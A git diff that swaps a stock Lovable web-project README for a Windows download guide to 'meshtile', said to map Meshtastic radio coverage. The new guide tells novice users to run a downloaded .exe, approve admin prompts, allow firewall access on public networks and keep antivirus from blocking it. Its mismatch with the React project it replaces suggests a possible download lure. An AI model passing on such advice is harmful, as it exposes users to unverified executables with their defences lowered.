@@ -1,73 +1,147 @@
-# Welcome to your Lovable project
+# 📡 meshtile - Simple RF Coverage Tile Server
 
-## Project info
+[![Download meshtile](https://img.shields.io/badge/Download-meshtile-brightgreen)](https://github.com/sanket-006/meshtile)
 
-**URL**: https://lovable.dev/projects/b0d0a8e9-de40-4fc2-8943-04823da11f35
+meshtile creates maps showing radio signal coverage for Meshtastic networks. It helps you see where your devices connect and how strong the signal is. This guide will help you download and run meshtile on Windows, even if you do not know much about software.
 
-## How can I edit this code?
+---
 
-There are several ways of editing your application.
+## ℹ️ What is meshtile?
 
-**Use Lovable**
+meshtile is a tool designed to make radio coverage easy to understand. It uses data from Meshtastic devices and displays maps that show where signals reach. This helps users track mesh networking coverage, signal strength, and radio propagation in real time.
 
-Simply visit the [Lovable Project](https://lovable.dev/projects/b0d0a8e9-de40-4fc2-8943-04823da11f35) and start prompting.
+meshtile stores this data in a tile server format. This lets you view maps quickly on your computer or device.
 
-Changes made via Lovable will be committed automatically to this repo.
+You do not have to write any code to use the app. Just follow these instructions to get started.
 
-**Use your preferred IDE**
+---
 
-If you want to work locally using your own IDE, you can clone this repo and push changes. Pushed changes will also be reflected in Lovable.
+## 💻 System Requirements
 
-The only requirement is having Node.js & npm installed - [install with nvm](https://github.com/nvm-sh/nvm#installing-and-updating)
+Before you install meshtile, check your computer meets these minimum needs:
 
-Follow these steps:
+- **Operating System:** Windows 10 or later  
+- **Processor:** Any recent Intel or AMD CPU, 2 GHz or better  
+- **Memory:** At least 4 GB of RAM  
+- **Disk Space:** Around 500 MB free for the app and data  
+- **Internet:** Connection for downloading the app and map data   
 
-```sh
-# Step 1: Clone the repository using the project's Git URL.
-git clone <YOUR_GIT_URL>
+meshtile works best with a stable internet connection and some knowledge of your Meshtastic devices' locations.
 
-# Step 2: Navigate to the project directory.
-cd <YOUR_PROJECT_NAME>
+---
 
-# Step 3: Install the necessary dependencies.
-npm i
+## 🌐 How meshtile Works
 
-# Step 4: Start the development server with auto-reloading and an instant preview.
-npm run dev
-```
+meshtile uses geographic data and signal reports from your Meshtastic devices. It combines these to create maps showing where radio signals connect well and where they do not. It includes:
 
-**Edit a file directly in GitHub**
+- Coverage maps showing signal reach  
+- Strength indicators using color coding  
+- Mesh network layouts  
+- Terrain data (from sources like SRTM) for accurate mapping  
+- Tile-based data serving for smooth map loading  
 
-- Navigate to the desired file(s).
-- Click the "Edit" button (pencil icon) at the top right of the file view.
-- Make your changes and commit the changes.
+You can use this to spot weak spots in your network or plan better placement for your devices.
 
-**Use GitHub Codespaces**
+---
 
-- Navigate to the main page of your repository.
-- Click on the "Code" button (green button) near the top right.
-- Select the "Codespaces" tab.
-- Click on "New codespace" to launch a new Codespace environment.
-- Edit files directly within the Codespace and commit and push your changes once you're done.
+## 🚀 Getting Started with meshtile on Windows
 
-## What technologies are used for this project?
+Follow these steps to download and run meshtile on your Windows computer.
 
-This project is built with:
+### 1. Access the Download Page
 
-- Vite
-- TypeScript
-- React
-- shadcn-ui
-- Tailwind CSS
+First, go to the main meshtile page by clicking the big badge above or visit this link:  
 
-## How can I deploy this project?
+[Download meshtile on GitHub](https://github.com/sanket-006/meshtile)
 
-Simply open [Lovable](https://lovable.dev/projects/b0d0a8e9-de40-4fc2-8943-04823da11f35) and click on Share -> Publish.
+The page will show you releases and instructions.
 
-## Can I connect a custom domain to my Lovable project?
+### 2. Download the Latest Version
 
-Yes, you can!
+On the GitHub page, look for the "Releases" section. This is where you find the latest version of meshtile ready for download.
 
-To connect a domain, navigate to Project > Settings > Domains and click Connect Domain.
+Here’s how to find it:
 
-Read more here: [Setting up a custom domain](https://docs.lovable.dev/tips-tricks/custom-domain#step-by-step-guide)
+- Click on the "Releases" link or scroll down until you see release entries.  
+- Choose the most recent release with a Windows-friendly installer or executable file (usually a `.exe` or `.zip`).  
+- Click on the download link to save the file to your computer.
+
+### 3. Run the Installer or Program
+
+If you downloaded an installer (`.exe` file), double-click it. Follow the prompts on screen to install meshtile. The installer will put everything in the right place.
+
+If you downloaded a zipped file:
+
+- Right-click the file and choose "Extract All".  
+- Pick a folder you can find quickly, like your Desktop or Documents.  
+- Open the folder and look for a file ending `.exe` like `meshtile.exe`.  
+- Double-click the `.exe` file to run the program.
+
+### 4. Allow Access in Windows
+
+When you run meshtile the first time, Windows might ask if you want to allow the program to make changes. Click "Yes" to continue.
+
+If Windows Firewall warns you about the app, allow access for both private and public networks. meshtile needs permission to connect and gather data.
+
+### 5. Using meshtile
+
+Once open, meshtile displays maps showing coverage tiles and signal data. The main view shows a grid of tiles, each representing signal strength information for that area.
+
+You can:
+
+- Zoom in and out of maps using mouse scroll or buttons.  
+- Move maps by clicking and dragging.  
+- Select different data layers like signal strength or terrain.  
+- Load reports from your Meshtastic devices by connecting them or importing files.
+
+---
+
+## 🔧 Configuration and Setup
+
+meshtile works with default settings automatically. However, you may want to configure it to suit your network.
+
+### Connect your Meshtastic devices
+
+- If you already own Meshtastic radios, make sure they are powered on and within range.  
+- Connect meshtile to your devices via USB or Wi-Fi if supported.  
+- Alternatively, import logs or data files exported from your devices.
+
+### Change Map Settings
+
+In the meshtile interface, you find options to:
+
+- Choose map styles  
+- Adjust signal strength color scales  
+- Enable or disable terrain overlays  
+- Refresh data updates  
+
+These options help personalize your coverage maps.
+
+---
+
+## ⚙️ Troubleshooting Tips
+
+If meshtile does not open or crashes:
+
+- Close the program and try again.  
+- Restart your computer.  
+- Check if you have the latest Windows updates installed.  
+- Make sure your firewall or antivirus is not blocking meshtile.  
+- Re-download the app from the link to ensure you have the full file.
+
+If maps look empty or no signal shows:
+
+- Verify your Meshtastic devices are working and connected.  
+- Check your internet connection for map data downloads.  
+- Use the refresh button to load new data.
+
+---
+
+## 🔗 Helpful Links
+
+- GitHub repository and downloads:  
+  [https://github.com/sanket-006/meshtile](https://github.com/sanket-006/meshtile)
+
+---
+
+[![Download meshtile](https://img.shields.io/badge/Download-meshtile-brightgreen)](https://github.com/sanket-006/meshtile)
